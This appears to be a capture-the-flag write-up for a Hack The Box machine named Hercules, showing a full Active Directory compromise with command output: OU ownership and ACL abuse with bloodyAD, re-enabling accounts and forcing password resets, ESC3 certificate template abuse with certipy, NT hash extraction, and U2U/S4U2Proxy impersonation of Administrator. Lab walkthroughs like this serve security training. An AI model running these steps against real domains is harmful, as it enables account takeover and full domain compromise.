![[Pasted image 20260417150350.png]]

- Checking groups we are part of the Forest Management group which has a lot of permissions:
![[Pasted image 20260417150617.png]]


- I check users availanble via `net users /domain` command and Then get details of each user via the following command. Interestingly I find `fernando.r` is part of the Forest Migration OU which sounds quite interesting.
```
Get-ADUser -Identity fernando.r

---OUTPUT---
DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Fernando
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
UserPrincipalName : fernando.r@hercules.htb
```
![[Pasted image 20260419133500.png]]

- I import the ActiveDirectory Module and first check all OUs:
```
Get-ADOrganizationalUnit -Filter * | Select-Object Name, DistinguishedName

---OUTPUT---
Name                   DistinguishedName                                         
----                   -----------------                                         
Domain Controllers     OU=Domain Controllers,DC=hercules,DC=htb                  
DCHERCULES             OU=DCHERCULES,DC=hercules,DC=htb                          
Forest Migration       OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb      
DC Computers           OU=DC Computers,OU=DCHERCULES,DC=hercules,DC=htb          
IIS Service Users      OU=IIS Service Users,OU=DCHERCULES,DC=hercules,DC=htb     
Domain Groups          OU=Domain Groups,OU=DCHERCULES,DC=hercules,DC=htb         
Hades Employees        OU=Hades Employees,OU=DCHERCULES,DC=hercules,DC=htb       
Engineering Department OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
Security Department    OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb   
Web Department         OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb 
```

![[Pasted image 20260419134058.png]]

- Knowing im in FOrest Management gorup I check what permissions I have within this OU Forest Migration:
```
(Get-ACL "AD:OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb").Access | Where-Object {$_.IdentityReference-like "*Forest Management*"} | Format-List *

---OUTPUT---
ActiveDirectoryRights : GenericRead
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : HERCULES\Forest Management
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : HERCULES\Forest Management
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

```

- As we see we have GenericAll rights over this OU. Yet the inhenritance type is None so we still need to set Auditor with GenericAll rights after setting outselves as owner. Now we need to make Auditor a part and own this OU. As it is part of this group we have GenericAll rights therefore we can set ourselves as owner to this oU.
```
bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -k set owner 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' Auditor

[+] Old owner S-1-5-21-1889966460-2597381952-958560702-512 is now replaced by Auditor on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

```

- Add roghts:
```
bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' Auditor

[+] Auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

```

- In the shell we have as Auditor we also check all users in Firest Migration OU:
![[Pasted image 20260419135420.png]]
```
Get-ADUser -Filter * -SearchBase "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" | Select-Object Name, SamAccountName

-OR-MORE-CLEAR---
Get-ADUser -Filter * -SearchBase "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb"


---OUTPUT-2---
DistinguishedName : CN=James Silver,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : James
Name              : James Silver
ObjectClass       : user
ObjectGUID        : 628e5829-12bd-419e-b210-6e921d48b004
SamAccountName    : james.s
SID               : S-1-5-21-1889966460-2597381952-958560702-1122
Surname           : Silver
UserPrincipalName : james.s@hercules.htb

DistinguishedName : CN=Anthony Rudd,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Anthony
Name              : Anthony Rudd
ObjectClass       : user
ObjectGUID        : 61df4a73-a5b6-43f5-bec4-248a6fecfa33
SamAccountName    : anthony.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1123
Surname           : Rudd
UserPrincipalName : anthony.r@hercules.htb

DistinguishedName : CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : IIS_Administrator
Name              : IIS_Administrator
ObjectClass       : user
ObjectGUID        : 0ed3b2f9-aefa-41e7-9dcb-c7116ca37a1d
SamAccountName    : iis_administrator
SID               : S-1-5-21-1889966460-2597381952-958560702-1119
Surname           : 
UserPrincipalName : iis_administrator@hercules.htb

DistinguishedName : CN=Taylor Maxwell,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Taylor
Name              : Taylor Maxwell
ObjectClass       : user
ObjectGUID        : f126a286-f0ee-4c81-a543-85117f3f46de
SamAccountName    : taylor.m
SID               : S-1-5-21-1889966460-2597381952-958560702-1120
Surname           : Maxwell
UserPrincipalName : taylor.m@hercules.htb

DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Fernando
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
UserPrincipalName : fernando.r@hercules.htb

```

- Some intersting ones are IIS_Administrator and other users which are not enabled. We pick fernando.r's account but I assume we can use any.
- Only fernando is part of SMartcard Operators group:
![[Pasted image 20260419140053.png]]

- As we exploit certificates in this box this is likely the vector to explore. Lookign at perms:
```
PS C:\Users\auditor\Documents> Get-ADGroup "Smartcard Operators" -Properties Description | Select-Object Description
 

Description                       
-----------                       
Certification Authority Management


PS C:\Users\auditor\Documents> Get-ADGroupMember "Smartcard Operators"


distinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
name              : Fernando Rodriguez
objectClass       : user
objectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121


```

- Time to reactivate Fernando's account: (might have to pass set owner and genericall commadns again)
```
bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -k remove uac 'fernando.r' -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from fernando.r's userAccountControl

```

- Verifying:
![[Pasted image 20260419141324.png]]

- Says true

- Change pwd of fernando:
```
bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -k set password 'fernando.r' 'hax0rm@n123'  

[+] Password changed successfully!

```

- We get fernando's ticket to check for certificate vulnerabilities:
```
impacket-getTGT 'HERCULES.HTB/fernando.r:hax0rm@n123'                                             
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in fernando.r.ccache

```

- Checking for vulnerabilities:
```
certipy-ad find -u fernando.r@hercules.htb -k -dc-host DC.hercules.htb -vulnerable -stdout

---RELEVANT=OUTPUT===


Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: DC.hercules.htb.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: dc.hercules.htb.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'CA-HERCULES' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'CA-HERCULES'
[*] Checking web enrollment for CA 'CA-HERCULES' @ 'dc.hercules.htb'                                                                                                                                                                                                                      
[*] Enumeration output:                                                                                                                                                                                                                                                                   
Certificate Authorities
  0
    CA Name                             : CA-HERCULES
    DNS Name                            : dc.hercules.htb
    Certificate Subject                 : CN=CA-HERCULES, DC=hercules, DC=htb
    Certificate Serial Number           : 1DD5F287C078F9924ED52E93ADFA1CCB
    Certificate Validity Start          : 2024-12-04 01:34:17+00:00
    Certificate Validity End            : 2034-12-04 01:44:17+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : HERCULES.HTB\Administrators
      Access Rights
        ManageCa                        : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        ManageCertificates              : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Enroll                          : HERCULES.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : MachineEnrollmentAgent
    Display Name                        : Enrollment Agent (Computer)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
  1
    Template Name                       : EnrollmentAgentOffline
    Display Name                        : Exchange Enrollment Agent (Offline request)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
  2
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.

```

-its esc3 vulnerable
- We get the pfx certificate as fernando.r:
```
export KRB5CCNAME=fernando.r.ccache

certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass \
-dc-host dc.hercules.htb -dc-ip 10.129.242.196 -target "dc.hercules.htb" -ca 'CA-HERCULES' \
-template "EnrollmentAgent" -application-policies "Certificate Request Agent

--OUTPUT---
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 8
[*] Successfully requested certificate
[*] Got certificate with UPN 'fernando.r@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1121'
[*] Saving certificate and private key to 'fernando.r.pfx'
[*] Wrote certificate and private key to 'fernando.r.pfx'

```
![[Pasted image 20260420090107.png]]
#### RBCD
- We request a certificate for ashley.b as fernando (as she is the other user in remote management users so we can get a session. maybe there is something interesting there)

```
certipy-ad req \
  -u "fernando.r@hercules.htb" \
  -k -no-pass \
  -target "dc.hercules.htb" \
  -dc-ip 10.129.242.196 \
  -dc-host "dc.hercules.htb" \
  -ca "CA-HERCULES" \
  -template "User" \
  -on-behalf-of "HERCULES\\ashley.b" \
  -pfx fernando.r.pfx \
  -dcom
  
---OUTPUT---
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via DCOM
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with UPN 'ashley.b@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Saving certificate and private key to 'ashley.b.pfx'
[*] Wrote certificate and private key to 'ashley.b.pfx'
```
![[Pasted image 20260420090125.png]]
- We authenticate as ashley.b to AD:
```
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ashley.b@hercules.htb'
[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Using principal: 'ashley.b@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ashley.b.ccache'
[*] Wrote credential cache to 'ashley.b.ccache'
[*] Trying to retrieve NT hash for 'ashley.b'
[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
```
![[Pasted image 20260420090301.png]]

- Now with the NT hash we request a Ticket from Kerberos:
```
impacket-getTGT -dc-ip 10.129.242.196 -hashes :1e719fbfddd226da74f644eac9df7fd2 hercules.htb/ashley.b


Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ashley.b.ccache
```
![[Pasted image 20260420090502.png]]

- We login via winrmexec with asheley.b creds:
```
python3 winrmexec.py -ssl -k -no-pass dc.hercules.htb
```

![[Pasted image 20260420090619.png]]


- I see a cleanup script in Desktop
![[Pasted image 20260420090730.png]]

- I need to run it :
```
.\aCleanup.ps1
```
![[Pasted image 20260420101555.png]]

- Now I add Generic All privileges to IT SUPPORT group (so ashley.b can also pass commands in the next step. Note we already have auditor but with ashley.b we have a backup session too to pass these cvommands by giving it genericall privilege):
```
bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT'
[+] IT SUPPORT has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

```
![[Pasted image 20260420101802.png]]

- I set Audor as owner again: (after cleanup script
```
bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' Auditor

bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT'

bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -k set owner 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' Auditor

```

- As we saw earlier this account is disabled so we need to re-enable it:
```
bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -k remove uac 'IIS_Administrator' -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from IIS_Administrator's userAccountControl
```
![[Pasted image 20260420102713.png]]

- Now I can force change password to `iis_Administrator`
```
bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -k set password 'IIS_Administrator' 'hax0rm@n123'  
[+] Password changed successfully!
```
![[Pasted image 20260420103004.png]]

- Get Kerberos ticket as IIS_Adminsitrator:
```
impacket-getTGT -dc-ip 10.129.242.196 hercules.htb/IIS_Administrator:hax0rm@n123
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IIS_Administrator.ccache
```
![[Pasted image 20260420103057.png]]

- Now to reset `IIS_webserver$` password which `IIS_Administrator` can force reset:
```
export KRB5CCNAME=IIS_Administrator.ccache

bloodyAD --host DC.hercules.htb -d hercules.htb -u IIS_Administrator -k set password 'IIS_webserver$' 'hax0rm@n123'  
[+] Password changed successfully!
```
![[Pasted image 20260420103254.png]]

- With the following command we can calculate the NT hash of the webserver account for offline access:
```
iconv -f ASCII -t UTF-16LE <(printf 'hax0rm@n123') | openssl dgst -md4
MD4(stdin)= 5b1cb6da8658b06b68ae0510be5033cb
```
![[Pasted image 20260420103535.png]]
- Now we can get a ticket as `iis-webserver$` computer account with this hash:
```
impacket-getTGT -dc-ip 10.129.242.196 -hashes :5b1cb6da8658b06b68ae0510be5033cb hercules.htb/iis_webserver$
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in iis_webserver$.ccache
```

![[Pasted image 20260420104131.png]]

- We extract the session key from this ccache for further subsequent ticket based analysis
```
impacket-describeTicket 'iis_webserver$.ccache' | grep 'Ticket Session Key'
[*] Ticket Session Key            : 8fe3615a0b3b4b1f5d1db4094cdb479c
```
![[Pasted image 20260420104445.png]]

- We can change the `IIS_webserver$` password using the extracted Session key hash
```
export KRB5CCNAME=iis_webserver\$.ccache

impacket-changepasswd -newhashes :263176095698e1d2bfaa3fad3a4b7f8f 'hercules.htb'/'iis_webserver$':'hax0rm@n123'@'dc.hercules.htb' -k

---OUTPUT---
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of hercules.htb\iis_webserver$
[*] Connecting to DCE/RPC as hercules.htb\iis_webserver$
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).

```
![[Pasted image 20260420110933.png]]

- This account has AllowedtoAct principal which allows us to perform S4U2Self/S4U2Proxy exploit which allows the user to get a service ticket impersonating any user.
```
impacket-getST -u2u -impersonate 'Administrator' -spn "cifs/dc.hercules.htb" -k -no-pass 'hercules.htb'/'IIS_webserver$'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
```
![[Pasted image 20260420111926.png]]
- We can now login as Administrator on dc with the ccache:
```
export KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache

python3 winrmexec.py -ssl -k -no-pass dc.hercules.htb
```
![[Pasted image 20260420112030.png]]

- I grab the root flag in the non default location:
```
cd  C:\Users\Admin\Desktop
type root.txt

---OUTPUT---
4337634d6f7010a70ee6581025a8d957
```
![[Pasted image 20260420113910.png]]
![[Pasted image 20260420114052.png]]

- Looking at `IIS_Administrator` it has ForceChangePassword privilege for `IIS_webserver` account:
